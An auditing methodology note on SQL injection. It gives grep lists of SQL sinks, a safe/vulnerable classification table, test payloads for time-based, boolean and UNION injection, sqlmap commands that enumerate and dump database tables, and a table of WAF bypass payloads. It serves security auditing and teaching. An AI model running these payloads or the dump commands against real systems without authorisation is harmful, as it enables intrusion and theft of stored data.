# Auditing: SQL Injection
Tags: #auditing #sqli #methodology #day1

## Mindset Before Touching Anything

SQL injection lives wherever user-controlled data reaches a SQL execution function without parameterization. Modern SQLi is rarely the obvious `' OR 1=1--` in a login form — it's in ORDER BY clauses, search builders, ORM escape hatches, and second-order flows where data read from the database is concatenated into a new query. Think about **every path** user input takes to reach a SQL sink, including indirect paths through the database itself.

## Step 1: Map the Surface

### Code Review — Finding Sinks

Grep for every function that executes SQL. These are the sinks:

**Python:**
```
cursor.execute(        cursor.executemany(
.raw(                  .extra(
engine.execute(        session.execute(
text(
```

**Java:**
```
.executeQuery(         .executeUpdate(
.execute(              createStatement()
createNativeQuery(     .nativeQuery(
jdbcTemplate.query(
```

**Node.js:**
```
.query(                .execute(
pool.query(            connection.query(
sequelize.query(       knex.raw(
```

**PHP:**
```
mysqli_query(          mysql_query(
->query(               ->exec(
->prepare(
```

### For Each Sink, Classify

| Pattern | Status |
|---------|--------|
| `cursor.execute("... %s", (var,))` — parameterized tuple | Safe |
| `cursor.execute("... %s" % var)` — string formatting | **Vulnerable** |
| `cursor.execute(f"... {var}")` — f-string | **Vulnerable** |
| `cursor.execute("..." + var)` — concatenation | **Vulnerable** |
| Concatenation with only hardcoded values | Safe |
| Variable passed in — trace it | **Investigate** |

### Trace Back From Sink to Source

For every suspect variable, trace backwards:

- Comes from `request.*`, `req.query`, `$_GET`, `@RequestParam` → **User-controlled, vulnerable**
- Comes from a function parameter → **Check all callers of that function**
- Comes from the database → **Check who wrote that data (second-order risk)**
- Comes from config/environment → **Probably safe, verify**

### Check Structural Injection Points

These can't be parameterized and need allowlisting:

- `ORDER BY` with user-controlled column/direction
- Dynamic table or column names from user input
- User-controlled operators in search builders (=, LIKE, >, <)
- `IN (...)` clauses built dynamically

## Step 2: Test Systematically

### Black-Box — Identify the Database

```http
# MySQL: SLEEP()
param=test' AND SLEEP(3)--      → 3 sec delay = MySQL

# PostgreSQL: pg_sleep()
param=test' AND pg_sleep(3)--   → PostgreSQL

# MSSQL: WAITFOR DELAY
param=test'; WAITFOR DELAY '0:0:3'--  → MSSQL
```

### Black-Box — Test for Injection

```http
# String context detection
param=test'                → error or different behavior = possible injection
param=test''               → normal behavior = single quotes interpreted
param=test' AND '1'='1     → normal = injectable (true condition)
param=test' AND '1'='2     → different = injectable (false condition)

# Numeric context detection
param=1 AND 1=1            → normal
param=1 AND 1=2            → different = injectable

# Time-based confirmation
param=test' AND SLEEP(5)-- → 5 sec delay = confirmed
```

### Black-Box — Determine Exploitation Technique

```
1. Inject UNION SELECT with NULLs — do you see output? → UNION-based
2. Inject syntax error — do you see a DB error message? → Error-based
3. Inject AND 1=1 vs AND 1=2 — does the page differ? → Boolean-blind
4. Inject AND SLEEP(5) — does response time change? → Time-blind
5. Inject DNS/HTTP callback — do you receive it? → Out-of-band
```

### Automation

```bash
# sqlmap — automatic detection and exploitation
sqlmap -u "http://target/search?q=test" --batch --level=3 --risk=2

# Technique-specific
sqlmap -u "http://target/search?q=test" --technique=T --time-sec=3  # Time-blind only
sqlmap -u "http://target/search?q=test" --technique=U               # UNION only

# Enumeration chain
sqlmap -u "URL" --dbs                              # List databases
sqlmap -u "URL" -D dbname --tables                 # List tables
sqlmap -u "URL" -D dbname -T tablename --columns   # List columns
sqlmap -u "URL" -D dbname -T tablename --dump      # Extract data
```

## Developer Perspective: Why This Is Hard

- String concatenation is the most intuitive way to build dynamic queries
- The vulnerability is invisible during normal development testing
- ORMs are safe by default, but every ORM has raw SQL escape hatches for complex queries
- ORDER BY, table names, and column names **can't** be parameterized — developers must know to allowlist
- Second-order SQLi crosses code paths — the developer writing the INSERT and the developer writing the SELECT may be different people on different teams
- Legacy codebases have thousands of raw SQL queries that nobody wants to rewrite

## Common Patterns in the Wild

- **Admin dashboards with sortable tables** — ORDER BY injection via `?sort=column&dir=asc`
- **Search/filter builders** — dynamic column names and operators from dropdowns
- **Export/report features** — complex queries where developers drop to raw SQL
- **Login forms** — classic `' OR 1=1--` still appears in legacy systems
- **User profile fields** — stored in DB, read back, concatenated into queries (second-order)
- **REST API endpoints** — JSON body parameters used in queries, often less scrutinized than URL params
- **Batch operations** — dynamically building `IN (...)` clauses

## Red Flags During Testing

- Database error messages visible on the page (error-based extraction possible)
- Different HTTP status codes for valid vs. invalid queries (boolean-blind)
- Measurable response time differences when injecting `SLEEP()` (time-blind)
- `ORDER BY 1` works but `ORDER BY 100` errors (column count enumeration possible)
- Input with a single quote `'` causes a 500 error (string context injection likely)
- WAF blocking `UNION SELECT` but not `/*!50000UNION*//*!50000SELECT*/` (bypassable WAF)

## WAF Bypass Techniques

When a WAF blocks basic payloads, try these categories:

| Category | Example | Why It Works |
|----------|---------|-------------|
| Case mixing | `uNiOn SeLeCt` | SQL keywords are case-insensitive, WAF regex may not be |
| Comment whitespace | `UNION/**/SELECT` | MySQL treats `/**/` as a space, WAF doesn't see keywords adjacent |
| MySQL version comments | `/*!50000UNION*/ /*!50000SELECT*/` | MySQL executes as code if version >= 5.0, WAF sees comments |
| URL encoding | `%2527` (double-encoded `'`) | WAF sees encoded form, app decodes twice |
| No-quote techniques | `0x61646D696E` (hex for 'admin') | Avoids quote characters entirely |
| Function alternatives | `MID()` instead of `SUBSTRING()`, `BENCHMARK()` instead of `SLEEP()` | WAF blocklists specific function names |
| No-space techniques | `UNION(SELECT(password)FROM(users))` | Parentheses as delimiters, no spaces needed |
| Newline/tab injection | `UNION%0aSELECT` | `%0a` = newline, WAF may only match space-separated keywords |

WAFs are blocklist-based — same fundamental weakness as input sanitization. They parse HTTP, not SQL. The gap between the WAF's parser and the database's parser is where bypasses live.

## Links

- [[SQL Injection]] — main vulnerability reference
- [[Database Queries]] — how web apps interact with databases

## My Notes
